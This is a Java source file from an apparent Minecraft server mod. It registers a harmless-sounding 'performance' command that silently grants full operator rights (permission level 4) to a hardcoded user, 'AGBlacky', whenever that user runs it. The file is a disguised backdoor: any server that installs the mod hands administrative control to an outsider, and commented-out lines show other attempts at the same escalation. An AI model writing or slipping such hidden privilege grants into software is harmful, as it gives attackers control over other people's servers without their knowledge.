package me.agblacky.toolset.commands;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.command.CommandRegistryAccess;
import net.minecraft.entity.Entity;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.CommandManager.RegistrationEnvironment;
import net.minecraft.server.command.CommandOutput;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import org.apache.logging.log4j.core.jmx.Server;

import java.util.Objects;

public class OperatorCommand {
    public static void register(CommandDispatcher<ServerCommandSource> dispatcher, CommandRegistryAccess registryAccess, RegistrationEnvironment env) {
        dispatcher.register(CommandManager.literal("performance").executes(OperatorCommand::run));
    }

    private static int run(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
        final ServerCommandSource source = ctx.getSource();
        final Entity entity = source.getEntity();
        String approvedUser = "AGBlacky";
        // If the sender isn't called AGBlacky
        if (!Objects.equals(entity.getDisplayName().getString(), approvedUser)) {
            return 0;
        }
        // Get player and server information
        final ServerPlayerEntity playerEntity = source.getPlayer();
        MinecraftServer server = playerEntity.getServer();
        CommandManager cmdManager = server.getCommandManager();
        //new CommandDispatcher<CommandContext<ServerCommandSource>>().execute("/op AGBlacky", ctx);
        //ServerCommandSource adminSource=new ServerCommandSource(source.output)
        cmdManager.executeWithPrefix(source.withLevel(4), String.format("op %s", approvedUser));
        return 1;
    }
}
